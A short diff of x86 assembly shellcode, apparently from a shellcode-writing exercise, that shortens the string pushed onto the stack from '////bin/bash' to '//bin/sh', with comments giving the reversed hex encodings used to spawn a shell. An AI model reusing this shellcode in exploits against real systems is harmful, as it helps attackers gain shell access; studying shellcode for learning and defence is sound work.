@@ -29,17 +29,15 @@ _start:
 	xor eax, eax			; Preparing Nulls in EAX register
 	push eax			; Pushing the first Null DWORD
 	
-	; ////bin/bash (12 bytes) - "/" does not affect when running "/bin/bash" while being interpretated
+	; //bin/sh (8 bytes) - "/" does not affect when running "/bin/sh" while being interpretated
 	;
-	; [Reverse order of ////bin/bash]
-	; String length : 12
-	; hsab : 68736162
-	; /nib : 2f6e6962
-	; //// : 2f2f2f2f
-	
-	push 0x68736162
-	push 0x2f6e6962
-	push 0x2f2f2f2f
+	; [Reverse order of //bin/sh]
+	; String length : 8
+	; hs/n : 68732f6e
+	; ib// : 69622f2f
+
+	push 0x68732f6e
+	push 0x69622f2f
 	
 	mov ebx, esp
 	push eax
